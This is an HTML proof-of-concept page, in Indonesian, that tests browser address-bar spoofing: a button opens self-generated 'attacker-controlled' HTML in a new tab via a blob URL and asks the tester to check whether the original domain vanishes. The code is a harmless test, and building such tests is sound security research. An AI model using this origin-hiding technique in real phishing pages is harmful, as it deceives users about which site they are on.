<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PoC Address Bar Spoofing - Blob Test</title>
    <style>
        body { font-family: -apple-system, sans-serif; padding: 30px; text-align: center; background-color: #fafafa; }
        button { background-color: #ff9500; color: white; border: none; padding: 15px 30px; font-size: 16px; border-radius: 10px; cursor: pointer; font-weight: bold; }
        .info { color: #555; font-size: 14px; margin-bottom: 20px; }
    </style>
</head>
<body>

    <h2>PoC Uji Coba Blob Origin</h2>
    <p class="info">Menguji apakah browser menyembunyikan atau salah menampilkan domain asal saat memuat dokumen objek memori.</p>
    
    <button onclick="testBlobSpoof()">Buka Konten Blob</button>

    <script>
        function testBlobSpoof() {
            // Konten tiruan yang akan disuntikkan ke dalam memori browser
            const htmlContent = `
                <html>
                <head><title>Halaman Terisolasi</title></head>
                <body style="font-family:sans-serif; text-align:center; padding-top:50px;">
                    <h1 style="color:red;">KONTEN DIKONTROL PENYERANG</h1>
                    <p>Periksa Address Bar Anda sekarang.</p>
                    <p>Jika domain github.io hilang atau berganti menjadi kosong/domain lain, bug ini valid.</p>
                </body>
                </html>
            `;

            // Membuat objek Blob di memori browser
            const blob = new Blob([htmlContent], { type: 'text/html' });
            const blobUrl = URL.createObjectURL(blob);

            // Membuka blob url di tab baru
            window.open(blobUrl, '_blank');
        }
    </script>

</body>
</html>
